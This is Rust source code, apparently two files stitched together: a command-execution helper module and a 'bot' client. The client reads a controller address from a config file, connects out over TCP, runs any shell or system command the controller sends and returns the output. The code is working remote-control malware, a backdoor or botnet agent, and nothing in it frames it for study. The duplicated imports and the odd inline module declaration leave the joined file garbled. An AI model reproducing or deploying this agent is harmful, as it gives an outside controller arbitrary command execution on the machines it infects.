use std::process::Command;
use std::io::{self, Write};

/// Execute a system command and return the output
/// 
/// # Arguments
/// * `command` - The command to execute
/// * `args` - Vector of arguments for the command
/// 
/// # Returns
/// * `Result<String, String>` - Ok with stdout if successful, Err with error message if failed
pub fn execute_command(command: &str, args: Vec<&str>) -> Result<String, String> {
    let output = Command::new(command)
        .args(&args)
        .output();

    match output {
        Ok(output) => {
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                Ok(stdout.to_string())
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Err(format!("Command failed with exit code {}: {}", output.status, stderr))
            }
        }
        Err(e) => {
            Err(format!("Failed to execute command: {}", e))
        }
    }
}

/// Execute a shell command (using sh -c)
/// 
/// # Arguments
/// * `command` - The shell command to execute
/// 
/// # Returns
/// * `Result<String, String>` - Ok with stdout if successful, Err with error message if failed
pub fn execute_shell_command(command: &str) -> Result<String, String> {
    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .output();

    match output {
        Ok(output) => {
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                Ok(stdout.to_string())
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Err(format!("Shell command failed with exit code {}: {}", output.status, stderr))
            }
        }
        Err(e) => {
            Err(format!("Failed to execute shell command: {}", e))
        }
    }
}

/// Execute a system command with real-time output streaming
/// 
/// # Arguments
/// * `command` - The command to execute
/// * `args` - Vector of arguments for the command
/// 
/// # Returns
/// * `Result<i32, String>` - Ok with exit code if successful, Err with error message if failed
pub fn execute_command_with_streaming_output(command: &str, args: Vec<&str>) -> Result<i32, String> {
    let mut child = Command::new(command)
        .args(&args)
        .spawn()
        .map_err(|e| format!("Failed to spawn command: {}", e))?;

    let status = child.wait()
        .map_err(|e| format!("Failed to wait for command: {}", e))?;

    Ok(status.code().unwrap_or(-1))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_execute_command() {
        // Test a simple command that should always work
        let result = execute_command("echo", vec!["hello"]);
        assert!(result.is_ok());
        assert_eq!(result.unwrap().trim(), "hello");
    }

    #[test]
    fn test_execute_invalid_command() {
        // Test an invalid command
        let result = execute_command("this_command_definitely_does_not_exist", vec![]);
        assert!(result.is_err());
    }

    #[test]
    fn test_execute_shell_command() {
        // Test a simple shell command
        let result = execute_shell_command("echo hello");
        assert!(result.is_ok());
        assert_eq!(result.unwrap().trim(), "hello");
    }
}

use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process;

mod src {
    pub mod executor;
}

const CONFIG_PATH: &str = "config/network.cfg";

fn read_config() -> Result<String, String> {
    std::fs::read_to_string(CONFIG_PATH)
        .map_err(|e| format!("Failed to read config file: {}", e))
}

fn parse_host_from_config(config: &str) -> Result<String, String> {
    for line in config.lines() {
        if line.starts_with("host=") {
            return Ok(line[5..].to_string());
        }
    }
    Err("Host not found in config".to_string())
}

fn connect_to_controller(host: &str) -> Result<TcpStream, String> {
    TcpStream::connect(host)
        .map_err(|e| format!("Failed to connect to controller at {}: {}", host, e))
}

fn read_command(mut stream: &TcpStream) -> Result<String, String> {
    let mut buffer = [0; 1024];
    let bytes_read = stream.read(&mut buffer)
        .map_err(|e| format!("Failed to read from stream: {}", e))?;

    if bytes_read == 0 {
        return Err("Connection closed by controller".to_string());
    }

    let command = String::from_utf8_lossy(&buffer[..bytes_read]).to_string();
    Ok(command)
}

fn send_response(mut stream: &TcpStream, response: &str) -> Result<(), String> {
    stream.write_all(response.as_bytes())
        .map_err(|e| format!("Failed to send response: {}", e))
}

fn process_command(command: &str) -> String {
    // Parse command - expected format: "EXECUTE_SHELL:<shell_command>" or "EXECUTE:<command>:<arg1>:<arg2>..."
    if command.starts_with("EXECUTE_SHELL:") {
        let shell_command = &command[14..]; // Skip "EXECUTE_SHELL:"
        match src::executor::execute_shell_command(shell_command) {
            Ok(output) => format!("SUCCESS:{}", output),
            Err(e) => format!("ERROR:{}", e),
        }
    } else if command.starts_with("EXECUTE:") {
        let parts: Vec<&str> = command[8..].split(':').collect(); // Skip "EXECUTE:"
        if parts.is_empty() {
            return "ERROR:Invalid command format".to_string();
        }

        let cmd = parts[0];
        let args = if parts.len() > 1 {
            parts[1..].to_vec()
        } else {
            vec![]
        };

        match src::executor::execute_command(cmd, args) {
            Ok(output) => format!("SUCCESS:{}", output),
            Err(e) => format!("ERROR:{}", e),
        }
    } else {
        "ERROR:Unknown command type".to_string()
    }
}

fn main() {
    println!("Bot starting...");

    // Read configuration
    let config = match read_config() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Error reading config: {}", e);
            process::exit(1);
        }
    };

    // Parse host from config
    let host = match parse_host_from_config(&config) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("Error parsing config: {}", e);
            process::exit(1);
        }
    };

    println!("Connecting to controller at {}...", host);

    // Connect to controller
    let mut stream = match connect_to_controller(&host) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Error connecting to controller: {}", e);
            process::exit(1);
        }
    };

    println!("Connected to controller!");

    // Main loop
    loop {
        // Read command
        let command = match read_command(&stream) {
            Ok(c) => {
                println!("Received command: {}", c.trim());
                c
            },
            Err(e) => {
                eprintln!("Error reading command: {}", e);
                break;
            }
        };

        // Process command
        let response = process_command(&command);
        println!("Sending response: {}", response);

        // Send response
        if let Err(e) = send_response(&stream, &response) {
            eprintln!("Error sending response: {}", e);
            break;
        }
    }

    println!("Bot shutting down.");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_host_from_config() {
        let config = "host=127.0.0.1:4444\nother=value";
        let host = parse_host_from_config(config).unwrap();
        assert_eq!(host, "127.0.0.1:4444");
    }

    #[test]
    fn test_process_command_execute() {
        let result = process_command("EXECUTE:echo:hello");
        assert!(result.starts_with("SUCCESS:"));
    }

    #[test]
    fn test_process_command_execute_shell() {
        let result = process_command("EXECUTE_SHELL:echo hello");
        assert!(result.starts_with("SUCCESS:"));
    }
}
